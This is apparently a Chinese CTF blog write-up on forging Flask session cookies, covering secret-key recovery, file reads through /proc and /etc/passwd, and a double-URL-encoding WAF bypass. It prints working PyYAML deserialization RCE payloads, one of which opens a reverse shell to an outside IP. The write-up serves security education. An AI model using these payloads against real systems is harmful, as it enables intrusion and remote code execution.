---
title: flask之Session伪造
categories: CTF
description: 开个flask
date: '2024-06-11 00:19'
tags: Python
abbrlink: 9586a6c4
---

前置知识:

```bash
/etc/passwd
该文件储存了该Linux系统中所有用户的一些基本信息，只有root权限才可以修改。其具体格式为      用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shell（以冒号作为分隔符）

/proc/self
proc是一个伪文件系统，它提供了内核数据结构的接口。内核数据是在程序运行时存储在内部半导体存储器中数据。通过/proc/PID可以访问对应PID的进程内核数据，而/proc/self访问的是当前进程的内核数据。

/proc/self/cmdline
该文件包含的内容为当前进程执行的命令行参数。

/proc/self/mem
/proc/self/mem是当前进程的内存内容，通过修改该文件相当于直接修改当前进程的内存数据。但是注意该文件不能直接读取，因为文件中存在着一些无法读取的未被映射区域。所以要结合/proc/self/maps中的偏移地址进行读取。通过参数start和end及偏移地址值读取内容。

/proc/self/maps
/proc/self/maps包含的内容是当前进程的内存映射关系，可通过读取该文件来得到内存数据映射的地址。
```



## flask session 伪造

### 一、session的作用

由于http协议是一个无状态的协议，也就是说同一个用户第一次请求和第二次请求是完全没有关系的，但是现在的网站基本上有登录使用的功能，这就要求必须实现有状态，而session机制实现的就是这个功能。
用户第一次请求后，将产生的状态信息保存在session中，这时可以把session当做一个容器，它保存了正在使用的所有用户的状态信息；这段状态信息分配了一个唯一的标识符用来标识用户的身份，将其保存在响应对象的cookie中；当第二次请求时，解析cookie中的标识符，拿到标识符后去session找到对应的用户的信息

### 二、flask session的储存方式

第一种方式：直接存在客户端的cookies中

第二种方式：存储在服务端，如：redis,memcached,mysql，file,mongodb等等，存在flask-session第三方库

flask的session可以保存在客户端的cookie中，那么就会产生一定的安全问题。

### 三、flask的session格式

flask的session格式一般是由base64加密的Session数据(经过了json、zlib压缩处理的字符串) . 时间戳 . 签名组成的。

```undefined
eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ(session数据).Y48ncA(时间戳 ).H99Th2w4FzzphEX8qAeiSPuUF_0(签名)              
```

时间戳：用来告诉服务端数据最后一次更新的时间，超过31天的会话，将会过期，变为无效会话；

签名：是利用`Hmac`算法，将session数据和时间戳加上`secret_key`加密而成的，用来保证数据没有被修改。

> 上面我们说到flask session是利用hmac算法将session数据，时间戳加上secert_key成的，那么我们要进行session伪造就要先得到secret_key，当我们得到secret_key我们就可以很轻松的进行session伪造。
>
> session伪造工具：https://github.com/noraj/flask-session-cookie-manager



---

### 四、开搞!

[HCTF 2018admin](https://buuoj.cn/challenges#)

本题解法很多,暂不放到本版块内,网上题解讲的也很好!

----

[[CISCN2019 华东南赛区]Web41]([BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#[CISCN2019 华东南赛区]Web4))

```python
# encoding:utf-8
import re
import random
import uuid
import urllib
from flask import Flask, session, request

app = Flask(__name__)
random.seed(uuid.getnode())
app.config['SECRET_KEY'] = str(random.random() * 233)
app.debug = True

@app.route('/')
def index():
    session['username'] = 'www-data'
    return 'Hello World! Read somethings'

@app.route('/read')
def read():
    try:
        url = request.args.get('url')
        m = re.findall('^file.*', url, re.IGNORECASE)
        n = re.findall('flag', url, re.IGNORECASE)
        if m or n:
            return 'No Hack'
        res = urllib.urlopen(url)
        return res.read()
    except Exception as ex:
        print(str(ex))
        return 'no response'

@app.route('/flag')
def flag():
    if session and session['username'] == 'fuck':
        return open('/flag.txt').read()
    else:
        return 'Access denied'

if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0")

```





1. `/read`路径现在已经没什么用处了，这里过滤了`flag`也就不能直接文件包含读取`flag.txt`了。`/`路径是给session字段赋值用户信息的

1. 其实`/flag`字段也很好理解，就是要修改session字段的用户为`fuck`，只需要抓取`/flag`的请求包，将其的session字段使用加解密脚本和私钥进行加解密，修改好用户信息之后将新的session字段替换一下，发送包即可得到`flag`。这道题关键也就在确定`python`后端，读取`/app/app.py`的网站源码信息

2. 直接读取/flag就行`注意这里的waf`!

3. ```python
   try:
           url = request.args.get('url')
           m = re.findall('^file.*', url, re.IGNORECASE)
           n = re.findall('flag', url, re.IGNORECASE)
           if m or n:
               return 'No Hack'
   ```


![image-20240611001721550](https://gitee.com/eviden/img/raw/master/image-20240611001721550.png)

----

[XCTF-Web-catcat-new](https://adworld.xctf.org.cn/)

首先是任意文件读取.

`/proc/self/cmdline`，用于获取当前启动进程的完整命令。

可知当前应用进程名为app.py

```python
import os
import uuid
from flask import Flask, request, session, render_template, Markup

flag = ""
app = Flask(
    __name__,
    static_url_path='/',
    static_folder='static'
)
app.config['SECRET_KEY'] = str(uuid.uuid4()).replace("-", "") + "*abcdefgh"
if os.path.isfile("/flag"):
    with open("/flag", "r") as f:
        flag = f.read()
    os.remove("/flag")

@app.route('/', methods=['GET'])
def index():
    detailtxt = os.listdir('./details/')
    cats_list = []
    for i in detailtxt:
        cats_list.append(i[:i.index('.')])

    return render_template("index.html", cats_list=cats_list, cat=cat)


@app.route('/info', methods=["GET", 'POST'])
def info():
    filename = "./details/" + request.args.get('file', "")
    start = request.args.get('start', "0")
    end = request.args.get('end', "0")
    name = request.args.get('file', "")[:request.args.get('file', "").index('.')]

    return render_template("detail.html", catname=name, info=cat(filename, start, end))


@app.route('/admin', methods=["GET"])
def admin_can_list_root():
    if session.get('admin') == 1:
        return flag
    else:
        session['admin'] = 0
        return "NoNoNo"


if __name__ == '__main__':
    app.run(host='0.0.0.0', debug=False, port=5637)

```

首先要得到`secret_key`andom指定了seed那么生成的随机数是固定的看一下[uuid](https://so.csdn.net/so/search?q=uuid&spm=1001.2101.3001.7020).getnode()的作用

![image-20240611223937587](https://gitee.com/eviden/img/raw/master/image-20240611223937587.png)

那我们可以通过读取当前的mac地址从而得到secret_key `/sys/class/net/eth0/address` 获得mac地址

当然也可以通过爆破所有的物理地址并且一个个看

> [[HDCTF 2023\]YamiYami | NSSCTF](https://www.nssctf.cn/problem/3780)

开题先不管,`f12`打开先

![image-20240614213148359](https://gitee.com/eviden/img/raw/master/202406142131527.png)

发现有东西!

`pwd`下提示为/app,`upload`是一个文件上传页面`read`当然就是文件读取了,它默认指向百度,ssrf探测内网文件.

![image-20240614213358240](https://gitee.com/eviden/img/raw/master/202406142133322.png)

正常读`/etc/passwd`,ok本地文件泄露

老套路,`/proc/self/cmdline`，用于获取当前启动进程的完整命令。

![image-20240614213508520](https://gitee.com/eviden/img/raw/master/202406142135567.png)

尝试直接读源码:遇到waf过滤了

![image-20240614214020542](https://gitee.com/eviden/img/raw/master/202406142140588.png)

**这里学到用双重url编码绕过正则解析url.**

参看大佬题解的说法

1. 接下来是最tricky的一点了, `urllib.request.urlopen` 可以直接接受urlencode的路径, 但是读本地文件时最前面的 `/` 要保留, 不能编码为 `%2F`

![image-20240614214426356](https://gitee.com/eviden/img/raw/master/202406142144418.png)

![image-20240614215549288](https://gitee.com/eviden/img/raw/master/202406142155353.png)

![image-20240614215558058](https://gitee.com/eviden/img/raw/master/202406142155101.png)

测试后发现确实如此,而且还说明一个很重要的问题就是这个urlopen()是可以接受url编码后的地址.

**为啥二次编码?**

`因为浏览器默认一次编码,意思就是你编码一次其实无所谓,你传上去还是你之前写的老东西,二次编码的目的就是要后端真正解析到的是我们一次url编码得到的字符串,以此达到绕过waf的目的`

ok道理说清楚我们可以开始读文件了.结果还是符合预期的.

![image-20240614215924115](https://gitee.com/eviden/img/raw/master/202406142159230.png)

GPT一键恢复大法:

```python
#encoding:utf-8 
import os 
import re
import random
import uuid 
from flask import *
from werkzeug.utils import secure_filename
import yaml
from urllib.request import urlopen

app = Flask(__name__) 
random.seed(uuid.getnode()) 
app.config['SECRET_KEY'] = str(random.random()*233) 
app.debug = False 
BLACK_LIST=["yaml","YAML","YML","yml","yamiyami"] 
app.config['UPLOAD_FOLDER'] = "/app/uploads" 

@app.route('/') 
def index(): 
    session['passport'] = 'YamiYami' 
    return ''' Welcome to HDCTF2023 
    Read somethings 
    Here is the challenge Upload file 
    Enjoy it pwd '''

@app.route('/pwd') 
def pwd(): 
    return str(pwdpath) 

@app.route('/read') 
def read(): 
    try: 
        url = request.args.get('url') 
        m = re.findall('app.*', url, re.IGNORECASE) 
        n = re.findall('flag', url, re.IGNORECASE) 
        if m: 
            return "re.findall('app.*', url, re.IGNORECASE)" 
        if n: 
            return "re.findall('flag', url, re.IGNORECASE)" 
        res = urlopen(url) 
        return res.read() 
    except Exception as ex: 
        print(str(ex)) 
        return 'no response' 

def allowed_file(filename): 
    for blackstr in BLACK_LIST: 
        if blackstr in filename: 
            return False 
    return True 

@app.route('/upload', methods=['GET', 'POST']) 
def upload_file(): 
    if request.method == 'POST': 
        if 'file' not in request.files: 
            flash('No file part') 
            return redirect(request.url) 
        file = request.files['file'] 
        if file.filename == '': 
            return "Empty file" 
        if file and allowed_file(file.filename): 
            filename = secure_filename(file.filename) 
            if not os.path.exists('./uploads/'): 
                os.makedirs('./uploads/') 
            file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename)) 
            return "upload successfully!" 
    return render_template("index.html") 

@app.route('/boogipop') 
def load(): 
    if session.get("passport") == "Welcome To HDCTF2023": 
        LoadedFile = request.args.get("file") 
        if not os.path.exists(LoadedFile): 
            return "file not exists" 
        with open(LoadedFile) as f: 
            yaml.full_load(f) 
        f.close() 
        return "van you see" 
    else: 
        return "No Auth bro" 

if __name__ == '__main__': 
    pwdpath = os.popen("pwd").read() 
    app.run(debug=False, host="0.0.0.0") 
    print(app.config['SECRET_KEY'])

```

代码审计:

> 之前题目3个url提示应该是有文件上传功能的.首先抓它文件上传了个什么玩意
> app.config['UPLOAD_FOLDER'] = "/app/uploads"

```python
    if file and allowed_file(file.filename): 
        filename = secure_filename(file.filename) 
        if not os.path.exists('./uploads/'): 
            os.makedirs('./uploads/') 
        file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename)) 
        return "upload successfully!" 
```
> 然后后面还写了个文件读取的功能

```python
@app.route('/boogipop') 
def load(): 
    if session.get("passport") == "Welcome To HDCTF2023": 
        LoadedFile = request.args.get("file") 
        if not os.path.exists(LoadedFile): 
            return "file not exists" 
        with open(LoadedFile) as f: 
            yaml.full_load(f) 
        f.close() 
        return "van you see" 
    else: 
        return "No Auth bro" 
# 老演员了,flask Session 伪造       
random.seed(uuid.getnode()) 
app.config['SECRET_KEY'] = str(random.random()*233) 
#验证完身份后它会执行
        with open(LoadedFile) as f: 
            yaml.full_load(f) 
#第一次接触这个,python的yaml反序列化漏洞
#不过这还有个黑名单
BLACK_LIST=["yaml","YAML","YML","yml","yamiyami"] 
#上传文件的时候要注意点

```

反序列化yaml上传文件写法

1.不反弹shell直接读,但是他这不能回显,所以通过重定向到一个文件,再通过我们之前的任意文件读取该文件的内容

(至于这个读flag的bash命令在群里跟群主好好深入了一波,会写的你可以6到飞起)

```yaml
!!python/object/new:str
  args: []
  state: !!python/tuple
    - "__import__('os').system('cat /proc/1/cmdline > /tmp/1.txt')"
    - !!python/object/new:staticmethod
      args: []
      state:
        update: !!python/name:eval
        items: !!python/name:list
```

2.反弹shell,一步到位,`日穿!`

```yaml
!!python/object/new:str
    args: []
    state: !!python/tuple
      - "__import__('os').system('bash -c \"bash -i >& /dev/tcp/139.199.210.235/13281 <&1\"')"
      - !!python/object/new:staticmethod
        args: []
        state:
          update: !!python/name:eval
          items: !!python/name:list
```

然后访问url`http://node2.anna.nssctf.cn:28809/boogipop?file`,执行yaml文件反序列化,造成rce即可

这里有个问题:

用bp的时候,我发现浏览器的session不会刷新的!

![image-20240614224325677](https://gitee.com/eviden/img/raw/master/202406142243795.png)

硬控我半小时了,艹!

下面来自群主大大的`抓`**flag**!

![image-20240615094033586](https://gitee.com/eviden/img/raw/master/202406150940863.png)

> grep -Pnir 'CTF{'  / 2>/dev/null
>
> find / -name '*flag*' -type f 2>/dev/null|grep -v sys
>
> find /tmp -name '*flag*' -type f 2>/dev/null|grep -v sys|xargs grep -Pnri 'NSSCTF{'
>
> stat /tmp/flag_13_123123

![image-20240615094144025](https://gitee.com/eviden/img/raw/master/202406150941143.png)